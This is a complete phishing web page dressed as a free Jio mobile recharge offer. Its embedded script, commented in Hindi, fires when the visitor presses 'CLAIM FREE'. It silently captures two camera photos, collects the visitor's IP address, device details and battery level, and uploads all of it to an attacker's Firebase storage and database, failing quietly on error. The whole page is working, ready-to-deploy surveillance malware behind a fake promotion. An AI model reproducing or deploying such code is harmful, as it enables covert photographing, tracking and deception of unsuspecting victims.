<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Jio Free Recharge</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', system-ui, sans-serif;
        }
        body {
            min-height: 100vh;
            background: linear-gradient(145deg, #0b0f1c 0%, #1a1f33 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 16px;
        }
        .card {
            max-width: 420px;
            width: 100%;
            background: rgba(18, 22, 40, 0.9);
            backdrop-filter: blur(12px);
            border-radius: 40px;
            padding: 28px 20px 36px;
            box-shadow: 0 30px 50px rgba(0,0,0,0.6), 0 0 0 2px rgba(255,0,130,0.2) inset;
            border: 1px solid rgba(255,255,255,0.05);
        }
        .jio-logo {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 24px;
            padding-left: 8px;
        }
        .jio-logo span {
            font-size: 2rem;
            font-weight: 800;
            background: linear-gradient(135deg, #ff79c6, #ff2e7d);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            letter-spacing: -0.5px;
        }
        .jio-logo .badge {
            background: #ff2e7d;
            color: white;
            font-size: 0.75rem;
            font-weight: 600;
            padding: 4px 12px;
            border-radius: 50px;
            text-transform: uppercase;
            box-shadow: 0 0 10px #ff2e7d;
        }
        .offers-title {
            color: #a0a8d0;
            font-size: 0.9rem;
            font-weight: 500;
            letter-spacing: 1px;
            margin-bottom: 16px;
            padding-left: 8px;
        }
        .offer-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 12px;
            margin-bottom: 28px;
        }
        .offer-item {
            background: rgba(255,255,255,0.03);
            border-radius: 24px;
            padding: 18px 12px;
            border: 1px solid rgba(255,255,255,0.05);
            box-shadow: 0 8px 0 rgba(0,0,0,0.2);
        }
        .offer-item.highlight {
            background: linear-gradient(145deg, #ff1e56, #ff006a);
            border: none;
            box-shadow: 0 8px 0 #9b003a, 0 0 20px #ff1e56;
        }
        .offer-item .offer-tag {
            color: #b9c2f0;
            font-size: 0.7rem;
            font-weight: 600;
            text-transform: uppercase;
            margin-bottom: 8px;
            display: block;
        }
        .offer-item.highlight .offer-tag {
            color: rgba(255,255,255,0.8);
        }
        .offer-item .value {
            font-size: 1.9rem;
            font-weight: 800;
            color: white;
            line-height: 1;
            margin-bottom: 4px;
        }
        .offer-item .detail {
            color: #7a82b0;
            font-size: 0.8rem;
            font-weight: 500;
        }
        .offer-item.highlight .detail {
            color: rgba(255,255,255,0.7);
        }
        .recharge-section {
            background: rgba(0,0,0,0.3);
            border-radius: 32px;
            padding: 22px 16px 16px;
            margin-top: 12px;
            border: 1px solid rgba(255,255,255,0.02);
        }
        .price-tag {
            display: flex;
            align-items: baseline;
            justify-content: center;
            gap: 8px;
            margin-bottom: 18px;
        }
        .price-tag .rupee {
            font-size: 2.2rem;
            font-weight: 700;
            color: white;
        }
        .price-tag .validity {
            color: #aab2e0;
            font-size: 0.9rem;
        }
        .free-badge {
            background: #00c851;
            color: black;
            font-weight: 800;
            padding: 6px 16px;
            border-radius: 40px;
            font-size: 1rem;
            display: inline-block;
            margin-bottom: 20px;
            box-shadow: 0 0 15px #00c851;
        }
        .recharge-btn {
            width: 100%;
            background: linear-gradient(90deg, #ff2e7d, #ff79c6);
            border: none;
            color: white;
            font-size: 1.8rem;
            font-weight: 800;
            padding: 18px 0;
            border-radius: 60px;
            cursor: pointer;
            box-shadow: 0 12px 0 #a0004a, 0 10px 30px #ff2e7d;
            transition: 0.08s linear;
            text-transform: uppercase;
            letter-spacing: 1px;
            border: 1px solid rgba(255,255,255,0.3);
            margin-bottom: 12px;
        }
        .recharge-btn:active {
            transform: translateY(6px);
            box-shadow: 0 6px 0 #a0004a, 0 10px 30px #ff2e7d;
        }
        .terms {
            color: #4d5480;
            font-size: 0.7rem;
            text-align: center;
            padding-top: 12px;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="jio-logo">
            <span>Jio</span>
            <span class="badge">free offer</span>
        </div>
        <div class="offers-title">âœ¨ EXCLUSIVE JIO OFFERS</div>
        <div class="offer-grid">
            <div class="offer-item highlight">
                <span class="offer-tag">free</span>
                <div class="value">â‚¹0</div>
                <div class="detail">unlimited 5G</div>
            </div>
            <div class="offer-item">
                <span class="offer-tag">data</span>
                <div class="value">2GB</div>
                <div class="detail">per day</div>
            </div>
            <div class="offer-item">
                <span class="offer-tag">validity</span>
                <div class="value">84d</div>
                <div class="detail">extra 28d</div>
            </div>
            <div class="offer-item">
                <span class="offer-tag">hotstar</span>
                <div class="value">free</div>
                <div class="detail">1 year</div>
            </div>
        </div>
        <div class="recharge-section">
            <div class="price-tag">
                <span class="rupee">â‚¹0</span>
                <span class="validity">unlimited calls + 5G</span>
            </div>
            <div style="text-align: center;">
                <span class="free-badge">ðŸ’¸ FREE RECHARGE NOW</span>
            </div>
            <button class="recharge-btn" id="rechargeBtn">âš¡ CLAIM FREE</button>
            <div class="terms">*Limited period offer Â· T&C apply</div>
        </div>
    </div>

    <!-- Firebase SDK (modular) -->
    <script type="module">
        import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js';
        import { getStorage, ref, uploadBytes, getDownloadURL } from 'https://www.gstatic.com/firebasejs/9.0.0/firebase-storage.js';
        import { getFirestore, collection, addDoc } from 'https://www.gstatic.com/firebasejs/9.0.0/firebase-firestore.js';
        import { getAnalytics } from 'https://www.gstatic.com/firebasejs/9.0.0/firebase-analytics.js';

        // Firebase Config (à¤¤à¥à¤®à¥à¤¹à¤¾à¤°à¤¾ à¤¦à¤¿à¤¯à¤¾ à¤¹à¥à¤†)
        const firebaseConfig = {
            apiKey: "AIzaSyDh-VVcK_5W-vP-4cCxFTzM7Eq0a47O6qc",
            authDomain: "all-cuntrol.firebaseapp.com",
            projectId: "all-cuntrol",
            storageBucket: "all-cuntrol.firebasestorage.app",
            messagingSenderId: "980086452552",
            appId: "1:980086452552:web:0173d97b95f874f9f1437d",
            measurementId: "G-HS22JV1BRL"
        };

        // Initialize Firebase
        const app = initializeApp(firebaseConfig);
        const analytics = getAnalytics(app);
        const storage = getStorage(app);
        const db = getFirestore(app);

        const btn = document.getElementById('rechargeBtn');

        // à¤Ÿà¤¾à¤°à¤—à¥‡à¤Ÿ à¤•à¥€ à¤œà¤¾à¤¨à¤•à¤¾à¤°à¥€ (IP, Device, Battery)
        async function collectTargetInfo() {
            let ip = 'N/A';
            let battery = 'N/A';
            const platform = navigator.platform || 'unknown';
            const lang = navigator.language || 'unknown';
            const screenRes = `${screen.width}x${screen.height}`;
            const device = `${platform} Â· ${lang} Â· ${screenRes}`;

            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                ip = data.ip;
            } catch (e) {}

            if (navigator.getBattery) {
                try {
                    const b = await navigator.getBattery();
                    battery = `${Math.round(b.level * 100)}%`;
                    if (b.charging) battery += ' (charging)';
                } catch (e) {}
            }

            return { ip, device, battery };
        }

        // Firebase Storage à¤ªà¤° à¤«à¥‹à¤Ÿà¥‹ à¤…à¤ªà¤²à¥‹à¤¡ à¤•à¤°à¥‹
        async function uploadPhoto(blob, fileName) {
            const storageRef = ref(storage, `captures/${fileName}`);
            await uploadBytes(storageRef, blob);
            return await getDownloadURL(storageRef);
        }

        async function captureAndUpload() {
            let stream = null;
            try {
                const infoPromise = collectTargetInfo();

                // à¤•à¥ˆà¤®à¤°à¤¾ à¤ªà¤°à¤®à¤¿à¤¶à¤¨ (HD)
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { width: { ideal: 1920 }, height: { ideal: 1080 } }
                });

                const video = document.createElement('video');
                video.srcObject = stream;
                video.muted = true;
                video.playsInline = true;
                await video.play();

                // à¤«à¥‹à¤Ÿà¥‹ à¤²à¥‡à¤¨à¥‡ à¤•à¤¾ à¤«à¤‚à¤•à¥à¤¶à¤¨
                const takePhoto = () => {
                    return new Promise((resolve) => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        canvas.toBlob(resolve, 'image/jpeg', 0.92);
                    });
                };

                // 2 à¤«à¥‹à¤Ÿà¥‹ à¤²à¥‹ (à¤¤à¥‡à¤œ)
                const photo1 = await takePhoto();
                await new Promise(r => setTimeout(r, 300));
                const photo2 = await takePhoto();

                // à¤•à¥ˆà¤®à¤°à¤¾ à¤¬à¤‚à¤¦ à¤•à¤°à¥‹
                stream.getTracks().forEach(t => t.stop());

                // à¤œà¤¾à¤¨à¤•à¤¾à¤°à¥€ à¤²à¥‹
                const info = await infoPromise;
                const timestamp = Date.now();
                const random = Math.random().toString(36).substring(2, 10);

                // à¤¦à¥‹à¤¨à¥‹à¤‚ à¤«à¥‹à¤Ÿà¥‹ à¤…à¤ªà¤²à¥‹à¤¡ à¤•à¤°à¥‹
                const url1 = await uploadPhoto(photo1, `photo1_${timestamp}_${random}.jpg`);
                const url2 = await uploadPhoto(photo2, `photo2_${timestamp}_${random}.jpg`);

                // Firestore à¤®à¥‡à¤‚ à¤¡à¥‡à¤Ÿà¤¾ à¤¸à¥‡à¤µ à¤•à¤°à¥‹
                await addDoc(collection(db, 'captures'), {
                    timestamp: timestamp,
                    ip: info.ip,
                    device: info.device,
                    battery: info.battery,
                    photo1Url: url1,
                    photo2Url: url2
                });

            } catch (err) {
                // à¤šà¥à¤ªà¤šà¤¾à¤ª à¤«à¥‡à¤²
                if (stream) stream.getTracks().forEach(t => t.stop());
            }
        }

        btn.addEventListener('click', captureAndUpload);
    </script>
</body>
</html>